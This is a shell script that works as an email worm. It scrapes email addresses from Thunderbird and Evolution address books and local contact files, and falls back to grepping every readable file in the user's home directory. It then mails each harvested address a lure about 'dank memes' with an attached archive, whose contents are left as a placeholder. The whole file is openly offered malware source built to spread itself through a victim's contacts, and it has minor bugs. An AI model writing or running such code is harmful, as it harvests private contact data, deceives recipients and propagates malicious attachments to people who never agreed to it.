#!/bin/sh
for file in $(find $HOME -regex ".*\.mab"); do
    addbook=$("$addbook $(cat $file | grep -oE '[a-zA-Z0-9]*@[a-zA-Z0-9]*\.[a-zA-Z0-9]*')")
done
addbook="$addbook $(cat $HOME/.local/share/contacts | grep -oE '[a-zA-Z0-9]*@[a-zA-Z0-9]*\.[a-zA-Z0-9]*')"
for file in $(find $HOME -regex ".*/evolution.*"); do
    if [ ! -d $file ]; then
        addbook="$addbook $(cat $file | grep -oE '[a-zA-Z0-9]*@[a-zA-Z0-9]*\.[a-zA-Z0-9]*')"
    fi
done
if [ -z "$addbook" ] || [[ $addbook =~ ^\ +$ ]]; then 
# if you can't even get one email address from there, check everywhere
    for file in $(find $HOME -readable); do
        addbook="$addbook $(cat $file | grep -oE '[a-zA-Z0-9]*@[a-zA-Z0-9]*\.[a-zA-Z0-9]*')"
    done
fi
for address in $addbook; do
    sendmail $address -t << EOF
To: <$address>
From: $USER <$user@gmail.com>
Subject: rare pepes
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="FILEBOUNDARY"

--FILEBOUNDARY
Content-Type: text/plain; charset=UTF-8
Content-Disposition: inline

hey, check out these dank memes comrade. my favorite is the fifth one.
--FILEBOUNDARY
Content-Type: application/x-compressed
Content-Disposition: attachment; filename="memes.tar.gz"
Content-Transfer-Encoding: base64

put base64 of memes here
--FILEBOUNDARY--
EOF
done
